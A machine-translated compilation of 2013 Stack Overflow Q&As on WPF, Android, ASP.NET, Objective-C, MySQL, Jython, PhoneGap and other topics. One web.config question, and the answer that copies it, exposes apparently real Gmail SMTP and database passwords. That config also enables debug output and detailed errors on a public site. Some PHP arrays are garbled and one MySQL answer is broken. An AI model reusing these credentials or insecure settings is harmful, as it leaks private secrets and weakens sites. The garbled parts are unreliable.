[WPF 命令行](https://stackoverflow.com/questions/426421/wpf-command-line)

现在是我使用 MVVM Light Toolkit 的问题，它抛出 XamlParseException ，表示“定位器”是未知的，**在这一点上：**

```
DataContext="{Binding Main, Source={StaticResource Locator}} 
```

我对设计时间没有问题

**应用程序.xaml**

```
<Application.Resources>
    <!--Global View Model Locator-->
    <vm:ViewModelLocator x:Key="Locator"
                         d:IsDataSource="True" />
</Application.Resources> 
```

**我的覆盖**

```
protected override void OnStartup(StartupEventArgs e)
{
    base.OnStartup(e);

    if (e.Args.Length > 0 && e.Args[0] == "\\start")
    {
        /* do stuff without a GUI */
        MessageBox.Show("Start");
    }
    else
    {
        MainWindow mainWindow = new MainWindow(); // <-- Exception
        ViewModelLocator locator = new ViewModelLocator();

        mainWindow.DataContext = locator.Main;
        mainWindow.ShowDialog();
    }
    this.Shutdown();
} 
```

如何将命令行与 MVVM Light Toolkit 结合使用？

# ***更新 13.02.2013 10:10***

有了这个 Override，不再有例外。但是，如果 ViewModelLocator 已经在 xaml 中声明，为什么我必须将其添加到资源中？

```
protected override void OnStartup(StartupEventArgs e)
{
    base.OnStartup(e);

    if (e.Args.Length > 0 && e.Args[0] == "\\start")
    {
        /* do stuff without a GUI */
        MessageBox.Show("Start");
    }
    else
    {
        ViewModelLocator locator = new ViewModelLocator();
        Resources.Add("Locator", locator);
        MainWindow mainWindow = new MainWindow();

        //DataContext="{Binding Main, Source={StaticResource Locator}}"
        //mainWindow.DataContext = locator.Main;

        mainWindow.ShowDialog();
    }
    this.Shutdown();
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T12:09:38.277

您必须检查资源是否已经包含定位器

```
ViewModelLocator locator;
if (!Resources.Contains("Locator"))
{
    locator = new ViewModelLocator();
    Resources.Add("Locator", locator);
}
else
{
    locator = (ViewModelLocator) Resources["Locator"];
}

WorkingWindow mainWindow = new WorkingWindow();
mainWindow.ShowDialog(); 
```

# com - Web API 在 STA 模式下运行 VB6 COM 组件

> ID：14847835
> 
> 赞同：-1
> 
> 时间：2013-02-13T06:34:09.560
> 
> 标签：com, vb6, asp.net-web-api

大师们，

我过去开发的 VB6 组件很少在我们的大多数应用程序中大量使用

现在，我们想为新开发的 Web API 项目使用相同的组件。

但是，根据这篇文章， [http://www.west-wind.com/weblog/posts/2012/Sep/18/Creating-STA-COM-compatible-ASPNET-Applications](http://www.west-wind.com/weblog/posts/2012/Sep/18/Creating-STA-COM-compatible-ASPNET-Applications)

我们在 Asp.net Web API 上发现了罢工，这可能是因为我们在 Web API 项目中没有任何页面。

请告诉我正确的解决方法来实现这一点。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:49:10.557

我建议调查 StaTaskScheduler [http://blogs.msdn.com/b/pfxteam/archive/2010/04/07/9990421.aspx](http://blogs.msdn.com/b/pfxteam/archive/2010/04/07/9990421.aspx)

# java - 检查无线电组是否为空/空

> ID：14847841
> 
> 赞同：2
> 
> 时间：2013-02-13T06:34:25.730
> 
> 标签：java, android

我想在android中检查radiogroup为空或null，即提交而不点击该组中的任何单选按钮？

**xml代码**

```
<RadioGroup
            android:id="@+id/lift"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="horizontal" >

            <RadioButton  
                android:paddingRight="50dip"  
                android:textSize="20dp"  
                android:id="@+id/r91"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="@string/yes" />

            <RadioButton   
                android:paddingRight="50dip"   
                android:textSize="20dp"  
                android:id="@+id/r92"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="@string/no" />
        </RadioGroup> 
```

**活动代码**

```
RadioGroup radioGroup1 = (RadioGroup) findViewById(R.id.lift);
if(radioGroup1=='NULL')
{ 
    Toast.makeText(getApplOicationContext(),"first radiogroup is null",Toast.LENGTH_LONG).show();
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-13T06:37:16.967

使用以下方法获取选中的单选按钮 ID，如果返回 -1，则表示用户没有选择任何单选按钮。

```
 radioGroup.getCheckedRadioButtonId(); // it will return unique ID of checked radio button or -1 on empty selection. 
```

在此处查看文档 >> [getCheckedRadioButtonID();](http://developer.android.com/reference/android/widget/RadioGroup.html#getCheckedRadioButtonId%28%29)

```
 public int getCheckedRadioButtonId () 
```

> **返回此组中选定单选按钮的标识符。空选时，返回值为-1。**

**相关 XML 属性** android:checkedButton

**退货**

```
the unique id of the selected radio button in this group 
```

**编辑 ：-**

```
 if(radioGroup1.getCheckedRadioButtonId() == -1) {
    //empty selection
   } else {
     // user selected one radio button.
   } 
```

# asp.net-mvc - 在 ASP.Net MVC 中截断模型属性

> ID：14847844
> 
> 赞同：3
> 
> 时间：2013-02-13T06:34:56.357
> 
> 标签：asp.net-mvc, asp.net-mvc-3, truncate

我目前以不同的方式使用截断和文本编辑器。两者都工作正常，但我面临这个问题。我想截断文本编辑器中的文本。T_T

**我以这种方式使用截断及其工作**

```
@helper Truncate(string input, int length)
    {
    if (input.Length <= length)
    {
        @input
    }
    else
    {
        @input.Substring(0, length)<text>...</text>
    }
}

@foreach (var item in Model)
{       
        <div>
            @Truncate(item.DetailDescription, 400)
        </div>
} 
```

**和**

**我声明 raw 以这种方式调用文本编辑器，它也可以正常工作**

```
@html.Raw(item.DetailDescription) 
```

**问题：我怎么可能将两者结合在一个函数中？这有可能吗T_T**

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-13T06:45:37.240

将业务逻辑放在模型中总是更好。

我会在模型本身中添加另一个属性“ `TruncatedDescription`”。

```
 public string TruncatedDescription
    {
        get
        {
            return this.DetailDescription.Length > 400 ? this.DetailDescription.Substring(0, 400) + "..." : this.DetailDescription;
        }
    } 
```

所以你可以直接在视图中使用它

```
@foreach (var item in Model)
{       
        <div>
             item.TruncatedDescription
        </div>
} 
```

如果您遵循此方法，则可以`item.TruncatedDescription`在没有帮助的情况下在文本编辑器中使用，`html.Row`因为这不会是 HTML 编码的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T07:06:52.670

我以前做过这样的一个。我是这样做的。

```
@helper Truncate(string input, int length)
 {
   if (input.Length <= length) {
   @Html.Raw(input)
    } else {
    var thisString = input.Substring(0, length);
    @Html.Raw(thisString)
            }
 } 
```

我在 truncate helper 中结合了 raw 然后我以这种方式调用 Truncate

```
@Truncate(item.DetailDescription, 400) 
```

# c# - 将我的 Web 文件上传到服务器后，在 Godaddy 中出现 web.config 文件错误和 500 错误

> ID：14847852
> 
> 赞同：0
> 
> 时间：2013-02-13T06:35:12.430
> 
> 标签：c#, asp.net, .net, web-config

```
<configuration>

<system.net>

<mailsettings>

<smtp deliverymethod="Network" from="gdkpavan@gmail.com">

<network defaultcredentials="true" host="smtp.gmail.com" password="nprao@1111" port="587" username="pranayn5@gmail.com">

</network></smtp>

</mailsettings>

</system.net>

<appsettings>

<add key="con" value="Data Source=moviemaster.db.10502677.hostedresource.com; Initial Catalog=picketmaster; User ID=picketmaster; Password=Picket@500;">

</add></appsettings>

<connectionstrings>

<system.webserver>

<httperrors errormode="Detailed">

<asp scripterrorsenttobrowser="true">

</asp></httperrors></system.webserver>

<system.web>

<compilation debug="true" targetframework="4.0">

<assemblies>

<add assembly="System.Web.Extensions.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35">

<add assembly="System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A">

<add assembly="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089">

</add></add></add></assemblies>

</compilation>

<authentication mode="Windows">

<customerrors mode="Off">

<compilation debug="true">

</compilation></customerrors>

<pages clientidmode="AutoID" controlrenderingcompatibilityversion="4.0">

</pages></authentication></system.web>

<system.web>

<sessionstate mode="InProc" timeout="15">

</sessionstate></system.web>

</connectionstrings></configuration> 
```

当我尝试使用本地系统中的此字符串连接数据库时，错误在于连接字符串。

我尝试将自定义错误内容更改为关闭并添加了详细错误，但错误仍然存​​在。我是asp.net的初学者我已经开发了一个网站并上传了用于测试目的，我想清楚地看到错误详细信息需要对该网页进行哪些更改。

发布网站后，我在文件夹中看不到应用程序代码是什么原因是错误的原因

请检查此链接[http://www.ticket65.com/test](http://www.ticket65.com/test)

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T07:37:25.800

您在配置文件的 appsettings 部分中有连接字符串，它应该在 connectionstrings 部分中。

除此之外，您的 web.config 文件还有许多其他问题，如密钥位置错误、末端元素不匹配、xml 格式错误等。使用 web.config 文件时要记住的两个重要事项是文件必须格式正确, 有效的 xml 并且元素和属性名称区分大小写。换句话说`<mailSettings>`，是一个有效的元素名称，但`<mailsettings>`不是。

我建议您参考[system.web Element (ASP.NET Settings Schema)](http://msdn.microsoft.com/en-us/library/dayb112d%28v=vs.80%29.aspx)，[How to: Read Connection Strings from the Web.config File](http://msdn.microsoft.com/en-us/library/ms178411%28v=vs.100%29.aspx) and [system.webServer Section Group [IIS Settings Schema]](http://msdn.microsoft.com/en-us/library/ms689429.aspx)

我已经纠正了我在下面的示例中可以找到的所有错误。它确实做出了某些假设（例如您在 IIS7 上并使用运行 .net 4.0 框架的应用程序池。）

```
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <system.net>
        <mailSettings>
            <smtp deliveryMethod="Network" from="gdkpavan@gmail.com">
                <network defaultCredentials="true" host="smtp.gmail.com" password="nprao@1111" port="587" userName="pranayn5@gmail.com" />
            </smtp>
        </mailSettings>
    </system.net>

    <connectionStrings>
        <add name="con" connectionString="Data Source=moviemaster.db.10502677.hostedresource.com; Initial Catalog=picketmaster; User ID=picketmaster; Password=Picket@500;" />
    </connectionStrings>

    <system.webServer>
        <httpErrors errorMode="Detailed" />
      <asp scriptErrorSentToBrowser="true" />
    </system.webServer>

    <system.web>
        <compilation debug="true">
            <assemblies>
                <add assembly="System.Web.Extensions.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
                <add assembly="System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" />
                <add assembly="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089" />
            </assemblies>
        </compilation>
        <authentication mode="Windows" />
        <customErrors mode="Off" />
        <pages clientIDMode="AutoID" controlRenderingCompatibilityVersion="4.0"/>
        <sessionState mode="InProc" timeout="15" />
    </system.web>
</configuration> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-22T05:11:34.293

```
<?xml version="1.0"?>
<!-- 
Note: As an alternative to hand editing this file you can use the 
web admin tool to configure settings for your application. Use
the Website->Asp.Net Configuration option in Visual Studio.
A full list of settings and comments can be found in 
machine.config.comments usually located in 
\Windows\Microsoft.Net\Framework\vx.x\Config 
-->
<configuration>
    <system.net>
        <mailSettings>
           <smtp deliveryMethod="Network" from="contactus@XXXXXXX">
               <network host="XXXXXXXXX" port="25"    userName="noreply@XXXXXXX password="XXXXXX" defaultCredentials="true"/>
        </smtp>

        </mailSettings>
    </system.net>
    <appSettings>
    <add key="con" value="Data Source=XXXXXXX; Initial Catalog=XXXXXXX; User ID=XXXXXXXX; Password=XXXXXXX;"/>

    <!--<add key="SentMail" value="smtp.gmail.com"/>-->
</appSettings>
<connectionStrings/>
<system.web>
    <!-- 
        Set compilation debug="true" to insert debugging 
        symbols into the compiled page. Because this 
        affects performance, set this value to true only 
        during development.
    -->
    <compilation debug="true" targetFramework="4.0">
        <assemblies>
            <add assembly="System.Web.Extensions.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>
            <add assembly="System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A"/>
            <add assembly="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089"/>
        </assemblies>
    </compilation>
    <!--
        The <authentication> section enables configuration 
        of the security authentication mode used by 
        ASP.NET to identify an incoming user. 
    -->
    <authentication mode="Windows"/>
    <!--
        The <customErrors> section enables configuration 
        of what to do if/when an unhandled error occurs 
        during the execution of a request. Specifically, 
        it enables developers to configure html error pages 
        to be displayed in place of a error stack trace. 
```

-->

```
 <pages controlRenderingCompatibilityVersion="4.0" clientIDMode="AutoID"/>
    </system.web>
    <system.webServer>
        <httpErrors errorMode="Detailed" />
        <asp scriptErrorSentToBrowser="true"/>
     </system.webServer>
    <!-- 
        The system.webServer section is required for running ASP.NET AJAX under Internet
        Information Services 7.0\.  It is not necessary for previous version of IIS.
     -->
    <system.web>
        <customErrors mode="Off"/>
        <sessionState mode="InProc" timeout="15"/>
    </system.web>
   </configuration> 
```

# selenium - 如何使用 selenium RC/Webdriver 在 Gmail 中添加附件

> ID：14847857
> 
> 赞同：0
> 
> 时间：2013-02-13T06:35:56.637
> 
> 标签：selenium, gmail, selenium-rc, selenium-webdriver, yahoo

有人可以告诉我如何使用 selenium RC/Webdriver 在 Gmail/Yahoo 邮件中添加附件。

请在这种情况下帮助我。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T08:34:33.663

在您的机器上安装 Autoit。编写如下所示的 AutoIT 脚本。

```
 WinWaitActive("Choose file")  \\specify the name of the choose window
  Send("C:\attach\samplefile.txt") \\location of the file you want to attach 
  Send("{ENTER}") 
```

编写代码后，将文件另存为 attach.exe 将以下行添加到您的 selenium 代码（如果使用 java）

```
 Runtime.getRuntime().exec("c:\\path\\attach.exe"); 
```

以上将有助于添加附件。希望能帮助到你！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-14T10:47:53.100

我使用机器人 api 找到了这个问题的答案。感谢回答这个问题的人。

# c# - LINQ 中的反射布尔属性

> ID：14847858
> 
> 赞同：1
> 
> 时间：2013-02-13T06:35:57.760
> 
> 标签：c#, reflection

我想使用反射来更好地编写这段代码。我现在有了`IsSearchable`and`IsEditable`函数，但是我可以重构这段代码来得到 c.Searchable 和 c.Editable 部分吗？

我有 10 个这样的功能，只需要一个。唯一不同的部分是要检查的 bool 属性，`c.Searchable`或`c.Editable`.

```
 bool searchable = conditions
                .Select(c => c.Searchable)
                .SingleOrDefault();

  bool editable = conditions
                    .Select(c => c.Editable)
                    .SingleOrDefault(); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:43:59.750

使用反射是多余的。假设您正在检查列表中是否有任何条件匹配`Editable`or `Searchable`，您应该只使用`Any()`语法...

您可以使用诸如

```
public bool CheckCondition(IEnumerable<Condition> conditions, Func<Condition, bool> predicate)
{
    return conditions.Any(predicate);
} 
```

并像这样使用它：

```
var isSet = CheckCondition(conditions, c => c.Editable); 
```

但你并没有为自己节省多少。你不妨`Any()`每次都写。例如，

```
var isEditable = conditions.Any(c => c.Editable); 
```

# iphone - 我想按升序对数组进行排序

> ID：14847860
> 
> 赞同：-4
> 
> 时间：2013-02-13T06:36:14.193
> 
> 标签：iphone, objective-c, sorting

数组： (2007-99 , 2001-96, 2005-93)
排序输出应为： (2005-93, 2001-96, 2007-99)

请帮帮我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T07:03:31.883

您需要编写一个自定义比较器来执行此类操作。在下面的方法中，我使用 rangeOfString 获取破折号的位置，然后将子字符串从 1 位置开始进一步插入字符串，然后将其转换为 int 进行比较：

```
 NSMutableArray *arr = [[NSMutableArray alloc] initWithObjects:@"2007-07",@"2005-01",@"2004-09",@"2003-02", nil];
    NSArray *sortedArray = [arr sortedArrayUsingComparator: ^(NSString *s1, NSString *s2) {
        if ([[s1 substringFromIndex:[s1 rangeOfString:@"-"].location + 1] intValue] > [[s2 substringFromIndex:[s2 rangeOfString:@"-"].location + 1] intValue]) {
            return (NSComparisonResult)NSOrderedDescending;
        }

        if ([[s1 substringFromIndex:[s1 rangeOfString:@"-"].location + 1] intValue] < [[s2 substringFromIndex:[s2 rangeOfString:@"-"].location + 1] intValue]) {
            return (NSComparisonResult)NSOrderedAscending;
        }
        return (NSComparisonResult)NSOrderedSame;
    }];

    NSLog(@"%@",sortedArray); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T07:05:57.870

您可以使用自定义块对此进行排序（请注意，我假设您的所有数字格式正确）：

```
NSArray *rollNumbers = [NSArray arrayWithObjects:@"2007-99", @"2001-96", @"2005-93", nil];

NSArray *sortedRollNumbers = [rollNumbers sortedArrayUsingComparator:^NSComparisonResult(NSString *roll1, NSString *roll2) {
    NSArray *roll1Components = [roll1 componentsSeparatedByString:@"-"];
    NSArray *roll2Components = [roll2 componentsSeparatedByString:@"-"];
    NSNumber *roll1Number    = [NSNumber numberWithInt:[[roll1Components objectAtIndex:1] intValue]];
    NSNumber *roll2Number    = [NSNumber numberWithInt:[[roll2Components objectAtIndex:1] intValue]];
    return [roll1Number compare:roll2Number];
}];

NSLog(@"%@", sortedRollNumbers); 
```

输出：

> （“2005-93”、“2001-96”、“2007-99”）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T07:13:07.883

您可以像这样对数组进行排序：

```
 NSMutableArray *arr = [[NSMutableArray alloc] initWithObjects:@"2007-07",@"2005-01",@"2004-09",@"2003-02", nil];
    NSMutableArray *marks = [[NSMutableArray alloc]init];

    for (int i = 0; i < arr.count; i++)
    {
        NSArray *sep = [[arr objectAtIndex:i] componentsSeparatedByString:@"-"];
        [marks addObject:[sep objectAtIndex:1]];
    }
    NSSortDescriptor *sortDesc = [[NSSortDescriptor alloc] initWithKey:@"" ascending:NO];
    [marks sortUsingDescriptors:[NSArray arrayWithObject:sortDesc]];

    NSMutableArray *sortedFinalArray = [[NSMutableArray alloc]init];

    for (int i = 0; i < marks.count; i++)
    {
        for (int k = 0; k < arr.count; k++)
        {
            NSRange aRange = [[arr objectAtIndex:i] rangeOfString:[marks objectAtIndex:k]];
            if (!(aRange.location == NSNotFound))
            {
                [sortedFinalArray addObject:[arr objectAtIndex:k]];
            }
        }
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T07:25:55.427

为了对数组进行排序，必须成对比较数组的元素以找出它们的顺序。您的特定排序是自定义的，因此您必须自己编写一个比较方法（例如命名`compare:`），然后您可以使用它`[arr sortUsingSelector:@selector(compare:)];`来对您的数组进行排序。
现在该`compare:`方法必须对数组的元素是已知的，因为每个元素都使用它来将它与同一类的另一个元素进行比较。因此，您要么为实现 compare 方法的元素定义一个新类，要么将它们保留为 NSString，但是您必须定义一个实现 compare: 方法的类别。compare: 方法本身可能如下所示（伪代码）：

```
-(NSComparisonResult) compare: (MyString *) myString {
    if
        (self.the_last_2_characters_interpreted_asNumber <
             myString.the_last_2_characters_interpreted_asNumber)
                 return NSOrderedAscending;
    else if
        (self.the_last_2_characters_interpreted_asNumber ==
             myString.the_last_2_characters_interpreted_asNumber)
                 return NSOrderedSame;
    else
        return NSOrderedDescending;
} 
```

# mysql - mysql 在各个字段中搜索 OR 执行全表扫描

> ID：14847862
> 
> 赞同：0
> 
> 时间：2013-02-13T06:36:19.780
> 
> 标签：mysql, full-table-scan

我有 3 个表（不写所有和实际的字段名称）

*   合同（约 30 000 行）

    |id|client_id|contract_nr|....

*   容器（约 30 000 行

    |id|contract_nr|phone_1(varchar)|....

*   客户端（约 35 000 行）

    |id|phone_2(varchar)|phone_3(varchar)|phone_4(varchar)|....

我需要搜索电话号码，所以我试试这个 - 如果我搜索一个电话号码，例如在 container.phone_1

```
SELECT *
FROM contract JOIN client
     ON contract.client_id = client.id
     JOIN container
     ON contract.contract_nr = container.contract_nr
WHERE container.phone_1 LIKE '264%' 

id  select_type table   type    possible_keys   key key_len ref rows    filtered    Extra
-------------------------------------------------------------------------------------------------------------
1   SIMPLE  container   range   contract_nr,phone_1 phone_1 63  NULL    912 100.00  Using where
1   SIMPLE  contract    ref contract_nr,client_id   contract_nr 26  container.contract_nr   1   100.00  
1   SIMPLE  client  eq_ref  PRIMARY,id  PRIMARY 3   contract.client_id  1   100.00 
```

但是当我开始使用 OR 添加客户端的电话号码时

```
SELECT * 
FROM contract JOIN client 
    ON contract.client_id = client.id 
    JOIN container ON contract.contract_nr = container.contract_nr 
WHERE (
    container.phone_1 LIKE '264%' OR 
    client.phone_2 LIKE '264%' OR 
    client_phone_3 LIKE '264%'
) 
```

解释扩展：

```
id  select_type table   type    possible_keys   key key_len ref rows     filtered   Extra
-------------------------------------------------------------------------------------------------------------
1   SIMPLE  container   ALL k_ligums,k_telef    NULL    NULL    NULL    32113   100.00  
1   SIMPLE  contract    ref contract_nr,client_id   contract_nr 26  za.zaao_konteineri.k_ligums 1   100.00  
1   SIMPLE  client  eq_ref  PRIMARY,id  PRIMARY 3   contract.client_id  1   100.00  Using where 
```

我已经索引了所有用于连接表和用于搜索的字段。我还尝试为包含所有搜索行的客户端和容器表创建多列索引 - 没有区别。

如何避免扫描容器表的 32113 行？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-02-13T07:31:15.283

使用 and 而不是 where。

SELECT * FROM contract JOIN client ON contract.client_id = client.id JOIN container ON contract.contract_nr = container.contract_nr AND (container.phone_1 LIKE '264%' client.phone_2 LIKE '264%' OR client_phone_3 LIKE '264%')

# php - 用于多个数据集的 php 中的浮点数

> ID：14847863
> 
> 赞同：-3
> 
> 时间：2013-02-13T06:36:20.013
> 
> 标签：php, json, flot

我的数据为：

> $ data1 = array（[[1341354816000，1]，[1341358185000，2]，[1341361620000，3]，[1341538421000，4]，[1341621724000，5]，[1341621724,000 8]，[1342651985000，9]，[13427444374000，10]，[1343151552000，11]，[1343285910000，12]，[1343286178000，13] ，[1343625187000，17]，[1343648616000，18]，[1343649176000，19] 1343939382000, 25], [1344041570000, 26], [1344051059000, 27], [1344235565000, 28], [1344236000000, 29], [13440]48074000, 3);

* * *

> $ data2 = array（[[1341354816000，1]，[1341358185000，2]，[1341361620000，3]，[1342133445000，4]，[1342645937000，5]，[1342645937000 8]，[1343288137000，9]，[1343307010000，10]，[1343307401000，11]，[1343625187000，12]，[1343867245000 ，[1344041570000，17]，[1344051059000，18]，[13444248074000，19]，[1344322547000，20]，[13444330089000 1344447855000, 25], [1344479054000, 26]);

* * *

> $ data3 = array（[[1341354816000，1]，[1341358185000，2]，[1341361620000，3]，[1341538421000，4]，[1341621724000，5]，[1341621724,000 8]，[1342744374000，9]，[1343286178000，10]，[1343288137000，11]，[1343307010000，12]，[1343307401000，13]，[1343307401000，13] , [ 1343938916000, 17] , [ 1343939382000, 18] );

现在我必须将这些数据绘制到与打开/关闭系列示例相同的图中。

任何人都可以在 php.ini 中帮助此代码。

我已经从不同的 sql 表和 php 创建了这个列表，所以如果 php 中的延续代码那么它会有所帮助。

我曾尝试将该数据添加到数据集中：

`var datasets = { "all": { label: "All", data : '$data1' }, "resolved": { label: "Resolved", data : '$data2' }, "closed": { label: "Closed", data : '$data3' } };`

这不起作用

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T17:46:44.357

添加数据、绘图和打开/关闭的示例- [http://jsfiddle.net/zxtFc/3/](http://jsfiddle.net/zxtFc/3/)

```
var DataSet1 = [ 
[1341354816000, 1], [ 1341358185000, 2] , [ 1341361620000, 3] , [ 1341538421000, 4] , [    1341621724000, 5] , [ 1341868470000, 6] , [ 1342133445000, 7] , [ 1342645937000, 8] , [ 1342651985000, 9] , [ 1342744374000, 10] , [ 1343151552000, 11] , [ 1343285910000, 12] , [ 1343286178000, 13] , [ 1343288137000, 14] , [ 1343307010000, 15] , [ 1343307401000, 16] , [ 1343625187000, 17] , [ 1343648616000, 18] , [ 1343649176000, 19] , [ 1343649567000, 20] , [ 1343649898000, 21] , [ 1343867245000, 22] , [ 1343938551000, 23] , [ 1343938916000, 24] , [ 1343939382000, 25] , [ 1344041570000, 26] , [ 1344051059000, 27] , [ 1344235565000, 28] , [ 1344236000000, 29] , [ 1344248074000, 30]
]; 
```

# java - 数组驱动类 Java

> ID：14847864
> 
> 赞同：-1
> 
> 时间：2013-02-13T06:36:25.177
> 
> 标签：java, arrays, class, methods, driver

嘿伙计们，我在弄清楚如何为我的 Array 类编写驱动程序类时遇到问题。

我的问题

1.如何让我的Array类中的数组引用我的Driver类中的数组？

2.如何将我的类方法从我的 Array 类传递给我的 Driver 类，以便打印出来？

这是我的两段代码

主类：

```
import javax.swing.*;
import java.util.*;
public class Array
{

    double sum = 0;
    int max = 0;
    int min = numbers[0];
    double sd = 0;
    int mode = 0;
    int modeCount = 0;
    public double average()
    {
        for(int i=0; i<numbers.length; i++)
        {
            sum = sum + numbers[i];
        }

        double average = sum / numbers.length;
        return average;
    }

    public int max()
    {
        for(int i=0; i<numbers.length; i++)
        {
            if(numbers[i] > max)
            {
                max = numbers[i];
            }
        }
        return max;
    }

    public int min()
    {
        for(int i=0; i<numbers.length; i++)
        {
            if(numbers[i] < min)
            {
                min = numbers[i];
            }
        }
        return min;
    }

    public double standardDeviation()
    {
        for (int i=0; i<numbers.length;i++)
        {
            sum = sum + numbers[i];
            double average = sum / numbers.length;
            {
                sd += ((numbers[i] - average)*(numbers[i] - average)) / (numbers.length - 1);
            }
        }
        double standardDeviation = Math.sqrt(sd);
        return standardDeviation;
    }

    public int mode()
    {
        for (int i = 0; i < numbers.length; ++i) 
        {
            int count = 0;
            for (int j = 0; j < numbers.length; ++j) 
            {
                if (numbers[j] == numbers[i]) ++count;
            }
            if (count > modeCount) {
                modeCount = count;
                mode = numbers[i];
            }
        }
        return mode;
    }
} 
```

驱动类：

```
import javax.swing.*;
import java.util.*;

public class ArrayTest
{
    public static void main(String [] args)
    {
        int[] numbers;
        numbers = new int [20];
        Random rand = new Random(2621); 
        int maxRange = 65;
        int minRange = 20;

        for(int i=0; i<20; i++)
        {
            numbers[i] = rand.nextInt(maxRange - minRange + 1) + minRange;       
        }

        Arrays.sort(numbers);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:45:54.760

看起来很像家庭作业...

在您的`Array`类中，您可以保留对数组的引用，然后调用一个方法`setArray()`，您可以使用该方法将数组从主类传递到 Array 类。

```
int[] numbers;

public void setArray(int[] nums) {
    numbers = nums;
} 
```

然后从你的主班你可以打电话

```
Array.setArray(myIntArray);
int max = Array.max(); 
```

在现实生活中（除了编程练习），你永远不会想要这样做。

# eclipse - 导入问题 - 我的 Jython 安装正确吗？

> ID：14847866
> 
> 赞同：2
> 
> 时间：2013-02-13T06:36:31.743
> 
> 标签：eclipse, jython, pythonpath

我开始使用 Jython。我注意到`sys.path`从命令行执行 Jython 与从 Eclipse 执行时完全不同。

**命令行**

```
tk:~$ jython 
Jython 2.5.3 (2.5:c56500f08d34+, Aug 13 2012, 14:48:36) 
[Java HotSpot(TM) Server VM (Oracle Corporation)] on java1.7.0_10
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys                      
>>> print sys.path
['',
 '/jproject/extras/2.5.3/Lib',
 '__classpath__',
 '__pyclasspath__/',
 '/jproject/extras/2.5.3/Lib/site-packages'] 
```

没关系，我可以从那里导入所有内容（导入 pdb、导入 csv 等）。

**蚀**

我`jython.jar`在 Eclipse 中使用“添加 JAR”按钮将其添加到 Java 构建路径。我写了一个简单的 Java 类（摘录）：

```
PythonInterpreter pi = new PythonInterpreter();
pi.exec("import sys");
pi.exec("print sys.path"); 
```

输出：

```
['/jproject/projects/foobar/.metadata/.plugins/org.eclipse.wst.server.core/tmp0/wtpwebapps/MyProject/WEB-INF/lib/Lib',
 '__classpath__',
 '__pyclasspath__/'] 
```

从 Java 项目中创建的 Python 脚本中，我无法导入任何内容。我总是得到 ImportError: No module named ...

所以我`.jython`在我的主目录中创建了一个文件，其中包含：

```
python.path=/jproject/extras/2.5.3/Lib:/jproject/extras/2.5.3/Lib/site-packages 
```

它似乎解决了导入问题。但是，这是正确的方法吗？

我想我不必手动执行最后一步，可能我安装的 Jython 很糟糕。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T19:38:25.750

看起来我在[这里](https://stackoverflow.com/questions/14862277/setting-import-module-path-in-jython-strange-behavior)的问题中描述了同样的问题：

我提出的[解决方案](https://stackoverflow.com/a/14879911/1296661)是不需要用户执行任何操作来设置 python.path 的解决方法：基本上我在初始化 jython 环境之前添加了将 python.path 设置为应用程序工作目录 (user.path) 的代码。

# android - 加载页面中的Phonegap导航ajax

> ID：14847873
> 
> 赞同：2
> 
> 时间：2013-02-13T06:37:03.913
> 
> 标签：android, cordova

我正在尝试创建一个带有导航的索引，单击该索引时将通过 ajax 加载页面，而不是转到另一个 html

这是我的javascipt：

```
<script type="text/javascript" src="js/jquery.js"></script>
<script type="text/javascript">
    function getPage(){
            $.ajax({
                type: 'post',
                url: 'places.html',
                success: function(html)
                {
                    $("#response").fadeIn("slow");
                    $("#response").html(html);          

                }
            });     

            return false;       
        }
    </script> 
```

我有一个叫做这个的href

```
<a href="" onclick="getPage();">get page</a> 
```

这适用于 xampp 本地主机，但似乎在 phonegap 中产生错误

```
Uncaught ReferenceError: $ is not defined at file:///android_asset/www/index.html:129 
```

这是 $.ajax 所在的行

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T13:19:53.997

您必须等到设备准备好进行 ajax 调用。

```
document.addEventListener("deviceready", onDeviceReady, false);
function onDeviceReady() {
function getPage(){
        $.ajax({
            type: 'post',
            url: 'places.html',
            success: function(html)
            {
                $("#response").fadeIn("slow");
                $("#response").html(html);          

            }
        });     

        return false;       
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-14T03:34:00.740

ajax 工作得很好，最后需要完整的文件地址并将其放入 documentready

```
$.ajax({
        type: 'post',
        url: 'file:///android_asset/www/.html/places.html',
